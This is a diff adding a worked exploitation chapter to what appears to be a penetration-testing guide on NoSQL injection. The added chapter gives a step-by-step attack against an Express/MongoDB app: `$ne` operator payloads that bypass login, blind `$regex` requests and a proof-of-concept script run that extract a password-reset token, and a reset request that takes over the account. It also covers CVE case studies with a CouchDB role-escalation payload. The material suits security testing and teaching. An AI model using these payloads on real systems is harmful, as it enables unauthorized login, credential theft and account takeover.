@@ -147,6 +147,74 @@ A reliable delay only on the true branch = blind boolean via timing. Keep sleeps
 
 # PART III — Exploitation by type
 
+## 3.0 The full attack, end-to-end — operator-injection auth bypass → blind reset-token extraction → ATO (worked transcript) ⭐
+
+> *This is the flagship worked example* — both NoSQLi sub-families in one arc: **operator injection** (`$ne`/`$gt` to flip a boolean) and **blind `$regex` extraction** (the ATO engine). It mirrors the real Rocket.Chat chain (§6.6, CVE-2021-22911): leak a password-reset token character-by-character and take over any account. Two own accounts, control-baselined, bounded reads; benign proof, then stop.
+
+**Target.** An Express + MongoDB app. `POST /api/login` takes a JSON body `{"username","password"}` → `db.users.findOne({username, password})`. Goal: prove auth bypass, then the higher-impact targeted ATO.
+
+**Step 1 — detect via the operator-injection differential (§2.2). Baseline first.** A wrong password gives a clean fail:
+```http
+POST /api/login HTTP/1.1
+Host: target.example
+Content-Type: application/json
+
+{"username":"alice","password":"wrongpass"}
+```
+```
+HTTP/1.1 401 Unauthorized
+{"error":"invalid credentials"}
+```
+Now swap the password *string* for an *operator* — if the app merges the JSON straight into the query, `$ne` changes the logic:
+```http
+{"username":"alice","password":{"$ne":"wrongpass"}}
+```
+```
+HTTP/1.1 200 OK
+{"token":"…","user":{"name":"alice"}}        # 200, not 401 → the operator reached the query = NoSQLi confirmed
+```
+The differential (401 for a string, 200 for `{"$ne":…}`) is control-baselined proof — not a reflected char, but the query's *answer* changed.
+
+**Step 2 — auth bypass, land as the first user (§3.1).** Make both fields always-true:
+```http
+{"username":{"$ne":null},"password":{"$ne":null}}
+```
+```
+HTTP/1.1 200 OK
+{"token":"…","user":{"name":"admin","role":"admin"}}   # first doc in the collection = the seed admin
+```
+**Logged in with no password.** Here the first user happened to be `admin` (common with seed accounts) → instant admin ATO. But don't rely on luck — the next step targets a *chosen* victim.
+
+**Step 3 — pivot to the targeted, higher-impact chain: blind-extract a reset token (§3.3).** Say I want a specific user (or the app's first doc isn't privileged). The password-reset flow stores a token in the user doc; a reset-status/policy endpoint leaks a true/false signal on it. I extract it char-by-char with `$regex` (the Rocket.Chat mechanic):
+```http
+POST /api/reset/verify HTTP/1.1
+Content-Type: application/json
+
+{"email":"victim@example.com","token":{"$regex":"^a"}}     → {"valid":false}   # not 'a'
+{"email":"victim@example.com","token":{"$regex":"^0"}}     → {"valid":false}
+{"email":"victim@example.com","token":{"$regex":"^7"}}     → {"valid":true}    # first char is '7'
+{"email":"victim@example.com","token":{"$regex":"^7f"}}    → {"valid":true}    # …extend one char at a time
+```
+```bash
+$ python3 poc/nosqli_blind.py -u https://target.example/api/reset/verify \
+    --email victim@example.com --field token --charset '0-9a-f' --true-marker '"valid":true'
+[+] extracting token: 7f3a9c1b… (binary-search over charset, ~4 requests/char)
+[+] token = 7f3a9c1b2e8d4a6f0c5b9e1d3a7f2c4e
+```
+Length is discoverable too (`{"$regex":"^.{32}$"}` → is it 32 chars?). `$where` (`this.token.match(/^7/)`) is the fallback when `$regex` is filtered.
+
+**Step 4 — use the token → ATO, benignly.** With the full reset token, complete the reset on the victim account **I own** (two-account rule), set a known password, log in as them:
+```http
+POST /api/reset/complete
+{"email":"victim@example.com","token":"7f3a9c1b2e8d4a6f0c5b9e1d3a7f2c4e","password":"pwned-by-me"}
+```
+```
+HTTP/1.1 200 OK  → then login → {"user":{"name":"victim"}}   # full account takeover
+```
+Targeting the admin's email here = admin ATO → (on Rocket.Chat) RCE via a malicious webhook. **I stop at "as attacker I logged into my second account B"** — bounded token extraction, no real user touched, no shell.
+
+**Why this is the NoSQLi-defining chain.** Step 1–2 show operator injection (the boolean flip that logs you in free); Step 3–4 show blind `$regex` extraction (the engine that turns *any* readable secret — reset token, hash, 2FA seed — into ATO). One JSON body that the app merged into a Mongo query, and neither step needed a visible error or a reflected value. Same root cause (untrusted input becomes a query *operator*), two cash-outs.
+
 > *In plain words:* the headline and the most common NoSQLi. The login is the form "find a user where username = X **and** password = Y." Replace the password value with the command `{"$ne": null}` ("any password that isn't empty") and the "and password matches" condition becomes *always true* — so the first user that matches the username (often the seed admin) gets logged in with no password at all. Pin `username:"admin"` if you want to land specifically as admin.
 
 ## 3.1 Authentication bypass (the flagship)
@@ -296,6 +364,20 @@ $function / $accumulator -> server-side JS
 | Aggregation `$lookup`/`$out` | Cross-collection read / write | High |
 
 **Chains:** [../IDOR/](../IDOR/) (authz), [../SSRF/](../SSRF/) (reach internal Redis/ES/Mongo), [../../API/GraphQL/](../../API/GraphQL/) & [../../API/REST/](../../API/REST/) (resolver/endpoint injection), [../JWT/](../JWT/) (exfiltrated secret → forge tokens), password-reset flow (token exfil → ATO).
+
+---
+
+# PART V.1 — Real-world NoSQLi case studies (verified)
+
+> Re-verified against primary sources (linked in §6.5) — the named events behind the techniques above.
+
+- **CVE-2021-22911 — Rocket.Chat (≤3.13): pre-auth blind NoSQLi → reset-token theft → ATO → RCE (the §3.0 chain, in the wild).** SonarSource found the `getPasswordPolicy` endpoint accepted a JSON object in the reset-token parameter and passed it into a Mongo query **without authentication** — so an attacker could inject the **`$regex`** operator and **leak a user's password-reset token character-by-character** (exactly §3.0 / §3.3). Extract the admin's token → take over the admin account → and from admin, reach **RCE via a malicious integration/webhook**. It's the textbook proof that blind `$regex` extraction of a reset token is a full ATO primitive, unauthenticated. Fixed in 3.13.2 / 3.12.4 / 3.11.4 (HackerOne #1130721). Lesson: **always test the password-reset/verify endpoints for operator injection** — they're frequently unauthenticated and hold the highest-value secret.
+
+- **CVE-2017-12635 — Apache CouchDB (<1.7.0 / 2.x<2.1.1): the duplicate-key privilege escalation.** CouchDB's Erlang JSON parser and its JavaScript parser disagreed on **duplicate keys**: submit a `_users` document with **two `roles` keys** and the second is used to authorize the write while the *first* is used for later authorization — so a non-admin could send `{"roles":["_admin"], … ,"roles":[]}` and grant themselves the **`_admin`** role → privilege escalation, and chained with CVE-2017-12636 → **RCE** as the database user. Fixed by making the Erlang parser mimic JavaScript's "last key wins" (1.7.1 / 2.1.1). Lesson: NoSQLi isn't only operators — **parser-differential / duplicate-key** tricks (§4) turn a document write into an authz bypass; it's the NoSQL cousin of HTTP parameter pollution.
+
+- **The `$ne`/`$gt` login bypass is the canonical, still-everywhere pattern.** Across PortSwigger's Web Security Academy, OWASP, PayloadsAllTheThings and NoSQLMap, the same primitive recurs: a login doing `findOne({username, password})` that merges request JSON (or bracket-notation `user[$ne]=`) straight into the filter lets `{"password":{"$ne":null}}` log you in with no password (§3.1). It persists because frameworks like Express+`qs` and PHP **auto-parse `user[$ne]=x` into a nested object** `{user:{$ne:"x"}}` — so even a plain form field becomes an operator. Memorise the operator differential; it's the highest-yield NoSQLi probe and the most common real finding.
+
+- **Why NoSQLi's ceiling is auth-bypass + ATO, and when it's RCE.** The through-line: operator injection flips booleans (login/authz bypass, filter widening), and blind `$regex`/`$where` extraction turns any readable field into a credential/token dump → ATO. RCE is the exception, reached only through a **server-side JS sink** (`$where`/`mapReduce`/`$function`, or the app piping "JS" into Node `eval`) or a **datastore-specific** path (Elasticsearch script CVE-2015-1427, Redis `CONFIG SET`+`SAVE` webshell, CouchDB+12636, Neo4j `apoc`). Confirm the exact sink before claiming a shell — most NoSQLi is Critical because of *ATO*, not RCE.
 
 ---
 
